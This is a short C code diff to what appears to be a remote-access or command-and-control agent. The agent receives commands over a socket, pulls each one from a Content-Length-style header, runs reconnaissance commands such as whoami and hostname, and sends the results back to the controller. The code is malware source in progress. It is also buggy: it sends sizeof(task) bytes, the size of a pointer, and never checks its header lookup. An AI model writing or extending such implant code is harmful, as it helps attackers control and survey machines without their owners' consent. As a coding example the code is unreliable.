@@ -42,21 +42,24 @@ void networking() {
     	char receive[1024];
     	printf("Receiving...\n");
     	int inferno_receive = recv(inferno_socket, receive, sizeof(receive), 0);
-    	receive[strcspn(receive, "\n")] = '\0';
     	printf("Executing: %s\n", receive);
-
-        char *task = executing(receive);
+        
+        char *content_length = strstr(receive, "Content-Length:");
+        content_length += strlen("Content-Length:");
+        char *command = strtok(content_length, " \r\n");
+        char *task = executing(command);
+        printf("'%s'", command);
 
     	//send
     	printf("Sending: %s from agent...\n", task);
-    	ssize_t inferno_send = send(inferno_socket, task, sizeof(task), 0);    
+    	ssize_t inferno_send = send(inferno_socket, task, sizeof(task), 0);
     	printf("Sent\n");
     }
 }
 
 char *executing(char *receive) {
     char *task;
-    if (strcmp(receive, "whoami") == 0) {
+    if (strcmp(receive, "1") == 0) {
         printf("Executing %s...\n", receive);
         task = whoamiCommand();
     } else if (strcmp(receive, "hostname") == 0) {
